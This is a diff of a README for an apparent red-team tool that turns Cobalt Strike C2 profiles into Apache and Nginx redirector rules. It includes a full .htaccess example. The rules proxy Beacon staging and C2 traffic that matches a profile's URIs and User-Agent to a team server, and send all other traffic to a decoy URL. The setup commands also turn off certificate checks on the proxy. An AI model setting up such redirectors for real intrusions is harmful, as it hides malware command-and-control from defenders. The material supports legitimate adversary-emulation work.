@@ -26,114 +26,67 @@ The havex.profile example is included for a quick test.
 
 ## Apache mod_rewrite Example Usage
 
-    python3 cs2modrewrite.py -i havex.profile -c https://TEAMSERVER -r https://GOHERE > /var/www/html/.htaccess
-    #### Save the following as .htaccess in the root web directory (i.e. /var/www/html/.htaccess)
-    
-    ########################################
-    ## .htaccess START 
-    RewriteEngine On
-<<<<<<< HEAD
-=======
-    ## Uncomment to enable verbose debugging in /var/logs/apache2/error.log
-    # LogLevel alert rewrite:trace5
->>>>>>> a3865dd3273a1d8f4f7a0a2899f2388f8e1f5547
-    
-    ## (Optional)
-    ## Scripted Web Delivery 
-    ## Uncomment and adjust as needed
-    #RewriteCond %{REQUEST_URI} ^/css/style1.css?$
-    #RewriteCond %{HTTP_USER_AGENT} ^$
-    #RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
-    
-    ## Default Beacon Staging Support (/1234)
-    RewriteCond %{REQUEST_URI} ^/..../?$
-    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-    RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
-    
-    ## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
-    ## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
-    ## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
-    ## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
-    ## Profile URIs
-    RewriteCond %{REQUEST_URI} ^(/include/template/isx.php.*|/wp06/wp-includes/po.php.*|/wp08/wp-includes/dtcla.php.*|/modules/mod_search.php.*|/blog/wp-includes/pomo/src.php.*|/includes/phpmailer/class.pop3.php.*|/api/516280565958.*|/api/516280565959.*)$
-    ## Profile UserAgent
-    RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
-    RewriteRule ^.*$ "https://TEAMSERVER%{REQUEST_URI}" [P,L]
-    
-    ## Redirect all other traffic here (Optional)
-    RewriteRule ^.*$ HTTPS://GOHERE/ [L,R=302]
-    
-    ## .htaccess END
-    ########################################
+```
+python3 cs2modrewrite.py -i havex.profile -c https://TEAMSERVER -r https://GOHERE > /var/www/html/.htaccess
+#### Save the following as .htaccess in the root web directory (i.e. /var/www/html/.htaccess)
 
-### Apache Rewrite Setup and Tips
+########################################
+## .htaccess START 
+RewriteEngine On
+## Uncomment to enable verbose debugging in /var/logs/apache2/error.log
+# LogLevel alert rewrite:trace5
+## (Optional)
+## Scripted Web Delivery 
+## Uncomment and adjust as needed
+#RewriteCond %{REQUEST_URI} ^/css/style1.css?$
+#RewriteCond %{HTTP_USER_AGENT} ^$
+#RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
 
-<<<<<<< HEAD
-Install apache and enable\disable appropriate modules
-=======
-    python ./cs2nginx.py -i havex.profile -c https://127.0.0.1 -r https://www.google.com -H mydomain.local
-    
-    python ./cs2nginx.py -h
-    usage: cs2nginx.py [-h] [-i INPUTFILE] [-c C2SERVER] [-r REDIRECT]
-                    [-H HOSTNAME]
+## Default Beacon Staging Support (/1234)
+RewriteCond %{REQUEST_URI} ^/..../?$
+RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
+RewriteRule ^.*$ "http://TEAMSERVER%{REQUEST_URI}" [P,L]
 
-    Converts Cobalt Strike profiles to Nginx proxy_pass format by using URI
-    endpoints to create regex matching rules. Make sure the profile passes a
-    c2lint check before running this script.
+## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
+## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
+## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
+## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
+## Profile URIs
+RewriteCond %{REQUEST_URI} ^(/include/template/isx.php.*|/wp06/wp-includes/po.php.*|/wp08/wp-includes/dtcla.php.*|/modules/mod_search.php.*|/blog/wp-includes/pomo/src.php.*|/includes/phpmailer/class.pop3.php.*|/api/516280565958.*|/api/516280565959.*)$
+## Profile UserAgent
+RewriteCond %{HTTP_USER_AGENT} "Mozilla/5.0 \(Windows; U; MSIE 7.0; Windows NT 5.2\) Java/1.5.0_08"
+RewriteRule ^.*$ "https://TEAMSERVER%{REQUEST_URI}" [P,L]
 
-    optional arguments:
-    -h, --help      show this help message and exit
-    -i INPUTFILE    C2 Profile file
-    -c C2SERVER     C2 Server (http://teamserver_ip or
-                    https://teamserver_domain)
-    -r REDIRECT     Redirect bad requests to this URL (http://google.com)
-    -H HOSTNAME     Hostname for Nginx redirector
+## Redirect all other traffic here (Optional)
+RewriteRule ^.*$ HTTPS://GOHERE/ [L,R=302]
 
-
-----------------------------------------------
-## Nginx Setup
-
-`apt-get install nginx nginx-extras`
-
-*Note:* `nginx-extras` is needed for custom server headers. If you can't get this package, then comment out the server header line in the resulting configuration file.
- 
+## .htaccess END
+########################################
+```
 ## Apache Rewrite Setup and Tips
 
 ### Enable Rewrite and Proxy
->>>>>>> a3865dd3273a1d8f4f7a0a2899f2388f8e1f5547
-
     apt-get install apache2
     a2enmod rewrite headers proxy proxy_http ssl cache
     a2dismod -f deflate
     service apache2 reload
 
-*Note:* https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/
+**Note:** https://bluescreenofjeff.com/2016-06-28-cobalt-strike-http-c2-redirectors-with-apache-mod_rewrite/
 "e0x70i pointed out in the comments below that if your Cobalt Strike Malleable C2 profile contains an Accept-Encoding header for gzip, your Apache install may compress that traffic by default and cause your Beacon to be unresponsive or function incorrectly. To overcome this, disable mod_deflate (via a2dismod deflate and add the No Encode ([NE]) flag to your rewrite rules. (Thank you, e0x70i!)"
 
-<<<<<<< HEAD
 ### Enable SSL support
 
 Ensure the following entries are in the site's config (i.e. `/etc/apache2/available-sites/*.conf`)
-=======
-### SSL support requires the following in the site config
->>>>>>> a3865dd3273a1d8f4f7a0a2899f2388f8e1f5547
 
     # Enable SSL
     SSLEngine On
-    
-    # Enable Proxy
+    # Enable SSL Proxy
     SSLProxyEngine On
-<<<<<<< HEAD
     # Trust Self-Signed Certificates generated by CobaltStrike
-=======
-    
-    # Trust Self-Signed Certificates
->>>>>>> a3865dd3273a1d8f4f7a0a2899f2388f8e1f5547
     SSLProxyVerify none
     SSLProxyCheckPeerCN off
     SSLProxyCheckPeerName off
     SSLProxyCheckPeerExpire off
-
 ### .HTACCESS
 
 If you plan on using mod_rewrite in .htaccess files (instead of the site's config file), you also need to enable the use of `.htaccess` files by changing `AllowOverride None` to `AllowOverride All`. For all websites, edit `/etc/apache2/apache.conf`
@@ -163,7 +116,9 @@ Next, reload apache, and monitor `/var/log/access.log` `/var/log/error.log` to s
 
 ### Install Nginx
 
-    apt-get install nginx
+    apt-get install nginx nginx-extras
+
+**Note:** `nginx-extras` is needed for custom server headers. If you can't get this package, then comment out the server header line in the resulting configuration file.
 
 ### Create Redirection Rules
 
